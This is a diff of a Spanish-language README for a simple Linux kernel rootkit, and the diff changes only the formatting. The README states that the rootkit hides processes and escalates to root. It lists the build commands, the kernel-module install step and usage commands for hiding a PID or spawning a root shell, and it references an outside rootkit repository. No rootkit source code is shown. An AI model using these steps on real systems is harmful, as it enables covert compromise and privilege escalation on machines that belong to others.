@@ -1,26 +1,26 @@
-Rootkit simple para linux
+#Rootkit simple para linux
 
 Este rootkit puede ocultar procesos y elevar privilegios como root
 
-//Compilado:
+#Compilado:
 
-$ sudo apt-get install linux-headers-$(uname -r)
-$ cd rootkit
-# make
+ $ sudo apt-get install linux-headers-$(uname -r)
+ $ cd rootkit
+ # make
 
-//Instalación:
+#Instalación:
 
-# insmod rt.ko
+ # insmod rt.ko
 
-//Uso:
+#Uso:
 
-//Para ocultar algun proceso
-# tools/rtcmd.py hpXXXX    // XXXX -> PID
+#Para ocultar algun proceso
+ # tools/rtcmd.py hpXXXX    // XXXX -> PID
 
-//Para devolver una terminal como root
-# tools/rtcmd.py modulo4root /bin/bash
+#Para devolver una terminal como root
+ # tools/rtcmd.py modulo4root /bin/bash
 
-//Referencias:
+#Referencias:
 
 ~https://github.com/ivyl/rootkit
 ~http://www.cyberciti.biz/tips/compiling-linux-kernel-module.html
